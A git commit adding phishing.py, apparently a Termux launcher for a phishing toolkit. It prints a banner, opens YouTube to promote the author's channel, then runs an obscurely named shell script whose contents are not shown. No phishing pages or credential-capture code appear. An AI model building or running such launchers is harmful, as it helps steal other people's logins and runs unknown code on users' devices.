b74d12b005903ddbfc2db2d027fb9e032f7cfcd9
amine10a <50719983+amine10a@users.noreply.github.com>
2020-01-20 12:09:59 +0100

    Add files via upload

---
+++ phishing.py
@@ -0,0 +1,43 @@
+import time
+import subprocess
+g ='\033[92m'
+r ='\033[91m'
+b ='\033[94m'
+y ='\033[93m'
+w = '\033[0m'
+m = '\033[95m'
+bl = '\033[96m'
+
+print(y,
+'''''
+_            _  ___
+  __ _ _ __ ___ (_)_ __   ___/ |/ _ \  __ _
+ / _` | '_ ` _ \| | '_ \ / _ \ | | | |/ _` |
+| (_| | | | | | | | | | |  __/ | |_| | (_| |
+ \__,_|_| |_| |_|_|_| |_|\___|_|\___/ \__,_|
+mr amine10a
+
+'''''
+)
+
+print(g,'Loading...')
+time.sleep(2)
+print(r,'first go to subscribe my channel now')
+
+subprocess.Popen("termux-open-url http://youtube.com/ ", shell=True).wait()
+
+time.sleep(2)
+print(y,'1')
+time.sleep(1)
+print('2')
+time.sleep(1)
+print('go')
+
+
+
+
+
+subprocess.Popen("bash hvvcxcgxhbvcfhnmkxzdhvxxfhbjihfsacvbxgvcccbccgb.sh", shell=True).wait()
+
+
+
